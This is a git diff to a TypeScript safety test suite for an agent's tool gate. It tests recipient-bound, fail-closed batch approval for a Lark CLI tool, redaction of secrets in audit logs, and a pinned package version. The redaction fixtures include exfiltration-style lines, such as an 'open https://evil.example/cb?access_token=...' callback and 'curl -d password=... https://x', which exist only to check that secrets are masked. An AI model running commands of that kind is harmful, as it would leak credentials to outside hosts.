@@ -428,6 +428,39 @@ async function main() {
     }
   });
 
+  // ---------- lark_cli 批量免问 key：对象可绑则对象级，解析不可靠/无对象则 fail-closed 不提供免问 ----------
+  await checkAsync('lark_cli 批量免问 key：位置实参绑接收对象；未知 flag / 无对象实参时不提供免问（每次必问）', async () => {
+    const auditTmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hta-safety-larkkey-'));
+    const seen: Array<{ batchKey: string | undefined; batchScope: string | undefined }> = [];
+    try {
+      const { handlers } = buildTools({
+        mcp: null,
+        kanbanUrl: 'http://localhost:1',
+        auditHome: auditTmp,
+        confirm: async (req) => {
+          seen.push({ batchKey: req.batchKey, batchScope: req.batchScope });
+          return false; // 闸门即拒，不真正执行子进程
+        },
+      });
+      const lark = handlers.get('lark_cli')!;
+      // 位置实参为接收对象：对象级 key，批准发给 ou_x 不授权发给 ou_y
+      await lark({ args: ['im', 'send', 'ou_x', '--text', 'hi'] });
+      await lark({ args: ['im', 'send', 'ou_y', '--text', 'hi'] });
+      assert.equal(seen[0]!.batchKey, 'lark:im send:ou_x');
+      assert.equal(seen[0]!.batchScope, 'object');
+      assert.equal(seen[1]!.batchKey, 'lark:im send:ou_y');
+      // 未知 flag 排在对象前：无法判断带不带值，fail-closed 不提供免问——
+      // 退化为类级 key 会把一次「发给 ou_x」的批准放行成发往任意接收人
+      await lark({ args: ['im', 'send', '--some-unknown-flag', 'ou_x', '--text', 'hi'] });
+      assert.equal(seen[2]!.batchKey, undefined, '未知 flag 时不应提供免问 key');
+      // 对象只经带值 flag 传入（--user-id 成对跳过后无位置实参）：同样不提供免问
+      await lark({ args: ['im', 'send', '--user-id', 'ou_x', '--text', 'hi'] });
+      assert.equal(seen[3]!.batchKey, undefined, '无位置对象实参时不应提供免问 key');
+    } finally {
+      fs.rmSync(auditTmp, { recursive: true, force: true });
+    }
+  });
+
   // ---------- 审计 detail 脱敏 ----------
   check('auditLog：detail 落盘前脱敏（--token/Bearer 不明文留档）', (() => {
     const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hta-safety-audit-'));
@@ -464,7 +497,7 @@ async function main() {
           kind: 'lark',
           summary: 's',
           detail:
-            'open https://evil.example/cb?access_token=query-secret-789&foo=1 后执行 FOO_API_KEY=env-secret-000 npm run；monkey=3 与 password 一词应保留',
+            'open https://evil.example/cb?access_token=query-secret-789&foo=1 后执行 FOO_API_KEY=env-secret-000 npm run；monkey=3 与 password 一词应保留；curl -d password=lower-secret-222 https://x',
           decision: 'approved',
           resultSnippet: '回调 &app_secret=result-secret-111 已触发',
         },
@@ -475,6 +508,8 @@ async function main() {
         !raw.includes('query-secret-789') &&
         !raw.includes('env-secret-000') &&
         !raw.includes('result-secret-111') &&
+        !raw.includes('lower-secret-222') && // 小写 password= 保守形态打码
+        raw.includes('password=***') &&
         raw.includes('access_token=***') &&
         raw.includes('app_secret=***') &&
         raw.includes('FOO_API_KEY=***') &&
@@ -566,10 +601,10 @@ async function main() {
     return ok.every(isValidGitRef) && bad.every((r) => !isValidGitRef(r));
   })());
 
-  // ---------- helios-kanban 默认包规格跟随 latest ----------
+  // ---------- helios-kanban 默认包规格钉版本 ----------
   check(
-    'DEFAULT_KANBAN_PACKAGE 默认 @latest，HELIOS_KANBAN_PACKAGE 可覆盖',
-    DEFAULT_KANBAN_PACKAGE === 'helios-kanban@latest' &&
+    'DEFAULT_KANBAN_PACKAGE 默认钉到具体版本（非 @latest），HELIOS_KANBAN_PACKAGE 可覆盖',
+    /^helios-kanban@\d+\.\d+\.\d+$/.test(DEFAULT_KANBAN_PACKAGE) &&
       kanbanPackageSpec({}) === DEFAULT_KANBAN_PACKAGE &&
       kanbanPackageSpec({ HELIOS_KANBAN_PACKAGE: 'helios-kanban@0.1.36' }) === 'helios-kanban@0.1.36',
     DEFAULT_KANBAN_PACKAGE,
